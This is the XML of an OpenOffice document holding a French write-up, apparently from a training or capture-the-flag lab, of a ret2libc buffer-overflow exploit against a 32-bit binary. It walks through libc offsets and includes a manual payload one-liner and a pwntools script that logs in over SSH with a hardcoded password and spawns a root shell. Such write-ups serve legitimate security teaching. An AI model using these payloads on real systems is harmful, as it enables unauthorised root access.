      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://thinkloveshare.com/hacking/pwn_2of4_ret2libc/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">https://thinkloveshare.com/hacking/pwn_2of4_ret2libc/</text:span></text:span></text:a><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> </text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Commençons par identifier l'adresse à laquelle la libc du binaire est chargée en ouvrant le binaire avec </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">gdb</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> sur le système cible, et en faisant un </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">info proc mapping</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> (après avoir </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">start</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> le programme pour que les librairies partagées aient bien été chargées) :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr4" draw:name="images9" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="7.154cm" draw:z-index="8"><draw:image xlink:href="Pictures/200000070000473700001DFAD7C2F7CC.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Notre librairie partagée (</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">/lib/i386-linux-gnu/libc-2.15.so</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">) est chargée à l'adresse </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">0xb7e2c000</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. On transfert cette librairie sur notre machine kali pour récupérer les offsets dont on a besoin.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On va avoir besoin, pour notre payload :</text:span></text:span></text:p>
      <text:list xml:id="list4382212572132431328" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P30"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">De l'offset de la fonction </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">system</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">.</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">De l'offset de la fonction </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">exit</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> (optionnel).</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">De l'offset d'une string "</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/bin/sh</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">".</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On récupère tout ça :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images10" text:anchor-type="paragraph" svg:x="0.31cm" svg:y="0.413cm" svg:width="15.372cm" svg:height="4.815cm" draw:z-index="9"><draw:image xlink:href="Pictures/2000000700003C0D000012D0CE699968.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On est désormais prêts à construire notre payload sous la forme :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">140 * 'A'<text:tab/>--<text:tab/>&lt;system addr&gt;<text:tab/>--<text:tab/>&lt;exit addr&gt;<text:tab/>--<text:tab/>&lt;"/bin/sh" addr&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">(Pour calculer les adresses, on ajoute simplement les payloads obtenus à l'adresse de base de la libc, c'est-à-dire 0xb7e2c000. Voir l'exploit automatique ci-dessous pour les détails).</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Avec ce payload, le flux d'exécution du programme va être redirigé vers la fonction </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">system</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. L'adresse de la fonction system va être </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">pop </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">par le ret, et le haut de la stack sera l'adresse de exit. Dans un programme </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">32 bits</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, lorsqu'une fonction est appelée, on place tout en haut de la stack :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">&gt; L'adresse de retour.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">&gt; Les éventuels arguments de la fonction appelée.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Ici, tout se passera donc comme si on avait appelé la fonction </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">system("/bin/sh")</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> de manière </text:span></text:span><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">légitime, et lorsqu'on fermera le terminal, la fonction </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">exit </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">sera appelée et le programme exploité va simplement quitter proprement.</text:span></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gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">Exploitation manuelle</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">./exploit_me $(python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')")</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">&gt;&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">Exploit automatique</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T35">from</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T17"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T27">pwn</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T17"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T35">import</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T17"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T27">*</text:span></text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P26"># system offset --&gt; 0003f060</text:p>
      <text:p text:style-name="P26"># libc loaded @ 0xb7e2c000</text:p>
      <text:p text:style-name="P26"># system @ 0xb7e6b060</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P26"># "/bin/sh" offset --&gt; 1444952 - 0x160c58</text:p>
      <text:p text:style-name="P26"># libc loaded @ 0xb7e2c000</text:p>
      <text:p text:style-name="P26"># "/bin/sh" @ 0xb7f8cc58</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P26"># exit offset --&gt; 00032be0</text:p>
      <text:p text:style-name="P26"># exit @ 0xb7e5ebe0</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:span text:style-name="T23">system_addr</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">b</text:span><text:span text:style-name="T36">'\x60\xb0\xe6\xb7'</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T23">exit_addr</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">b</text:span><text:span text:style-name="T36">'\xe0\xeb\xe5\xb7'</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T23">bin_sh</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">b</text:span><text:span text:style-name="T36">'\x58\xcc\xf8\xb7'</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:span text:style-name="T23">payload</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">b</text:span><text:span text:style-name="T36">'A'</text:span> <text:span text:style-name="T23">*</text:span> <text:span text:style-name="T28">140</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:span text:style-name="T23">payload</text:span> <text:span text:style-name="T23">+=</text:span> <text:span text:style-name="T23">system_addr</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T23">payload</text:span> <text:span text:style-name="T23">+=</text:span> <text:span text:style-name="T23">exit_addr</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T23">payload</text:span> <text:span text:style-name="T23">+=</text:span> <text:span text:style-name="T23">bin_sh</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:span text:style-name="T23">s</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">ssh(host=</text:span><text:span text:style-name="T36">'192.168.1.7'</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T23">port=</text:span><text:span text:style-name="T28">22</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T23">user=</text:span><text:span text:style-name="T36">"zaz"</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T23">password=</text:span><text:span text:style-name="T36">"646da671ca01bb5d84dbb5fb2238dc8e"</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T23">p</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">s.process([</text:span><text:span text:style-name="T36">'/home/zaz/exploit_me'</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T23">payload])</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P16">p.interactive()</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On récupère bien </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">l'utilisateur root</text:span></text:span><text:span text:style-name="Source_20_Text"><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9M55S</meta:editing-duration>
    <meta:editing-cycles>12</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2022-01-07T13:29:00.43</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="10" meta:object-count="0" meta:page-count="17" meta:paragraph-count="474" meta:word-count="3266" meta:character-count="22727"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>